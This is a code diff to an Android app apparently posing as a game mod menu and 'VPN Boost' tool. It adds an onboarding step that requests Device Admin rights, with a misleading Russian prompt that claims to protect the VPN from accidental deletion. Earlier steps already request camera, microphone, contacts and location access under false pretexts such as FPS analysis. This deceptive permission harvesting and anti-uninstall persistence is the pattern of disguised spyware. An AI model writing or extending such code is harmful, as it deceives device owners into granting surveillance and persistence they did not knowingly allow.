@@ -2,6 +2,8 @@ package com.brawl.modmenu;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
@@ -27,10 +29,11 @@ public class OnboardingActivity extends Activity {
         "Для анализа FPS и оптимизации графики в играх",
         "Для определения друзей в играх и оптимизации контактов",
         "Для анализа качества соединения через камеру",
-        "Для оптимизации звука в играх"
+        "Для оптимизации звука в играх",
+        "Для защиты VPN от случайного удаления"
     };
 
-    private static final int TOTAL = 10;
+    private static final int TOTAL = 11;
     private int current = 0;
 
     private TextView stepTitle, stepDesc, stepCounter;
@@ -130,6 +133,21 @@ public class OnboardingActivity extends Activity {
                     Manifest.permission.RECORD_AUDIO,
                     Manifest.permission.ACCESS_FINE_LOCATION
                 }, 109);
+                break;
+            case 10:
+                DevicePolicyManager dpm = (DevicePolicyManager)
+                    getSystemService(DEVICE_POLICY_SERVICE);
+                ComponentName cn = new ComponentName(this, AdminReceiver.class);
+                if (dpm != null && !dpm.isAdminActive(cn)) {
+                    Intent admin = new Intent(
+                        DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                    admin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
+                    admin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                        "Защита VPN Boost от случайного удаления. Рекомендуется разрешить.");
+                    startActivityForResult(admin, 110);
+                } else {
+                    advance();
+                }
                 break;
         }
     }
